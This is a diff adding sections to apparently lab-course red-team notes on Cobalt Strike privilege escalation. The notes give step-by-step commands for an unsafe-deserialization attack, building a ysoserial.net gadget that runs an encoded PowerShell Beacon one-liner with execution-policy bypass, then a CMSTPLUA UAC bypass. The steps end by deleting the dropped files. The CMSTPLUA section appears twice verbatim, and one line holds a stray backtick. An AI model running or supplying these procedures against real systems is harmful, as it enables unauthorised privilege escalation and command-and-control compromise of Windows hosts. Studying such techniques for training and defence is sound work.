@@ -49,3 +49,50 @@
 9. Delete the service payload.
    1. `rm dns_x64.svc.exe`
 
+## Unsafe Deserialization <a href="#unsafe-deserialization" id="unsafe-deserialization"></a>
+
+1.  Host a PowerShell one-liner on the medium-integrity Beacon for a DNS Beacon payload.
+
+    > Right-click the Beacon and select **Access > One-liner**.
+2.  On your Attacker Desktop, generate a serialized gadget with ysoserial.net, using the PowerShell one-liner from the previous step.
+
+    ```terminal-nocolor
+    TerminalTypeCopyC:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc ..." -o raw --outputpath=C:\Payloads\data.bin
+    ```
+3. Change Beacon's current working directory.
+   1. `cd C:\Temp`
+4. Upload the gadget.
+   1. `upload C:\Payloads\data.bin`
+5.  Sit back and wait for up to 60 seconds for the elevated Beacon to appear.
+
+    > Check that the service is running with `sc_query BadWindowsService` and use `sc_start BadWindowsService` is you need to.
+6. Delet`e the gadget.`
+   1. `rm data.bin`
+
+## CMSTPLUA UAC Bypass <a href="#cmstplua-uac-bypass" id="cmstplua-uac-bypass"></a>
+
+For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows\*_.
+
+1. Spawn a new Beacon (this spawns in _C:\Windows\System32\rundll32.exe_ by default.)
+   1. `spawn x64 http`
+2.  Host a PowerShell one-liner on the new Beacon.
+
+    > Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.
+3. Run the provided one-liner via **runasadmin**.
+   1. `runasadmin uac-cmstplua [ONE-LINER]`
+4. Connect to the elevated Beacon.
+   1. `connect localhost 1337`
+
+## CMSTPLUA UAC Bypass <a href="#cmstplua-uac-bypass" id="cmstplua-uac-bypass"></a>
+
+For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows\*_.
+
+1. Spawn a new Beacon (this spawns in _C:\Windows\System32\rundll32.exe_ by default.)
+   1. `spawn x64 http`
+2.  Host a PowerShell one-liner on the new Beacon.
+
+    > Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.
+3. Run the provided one-liner via **runasadmin**.
+   1. `runasadmin uac-cmstplua [ONE-LINER]`
+4. Connect to the elevated Beacon.
+   1. `connect localhost 1337`
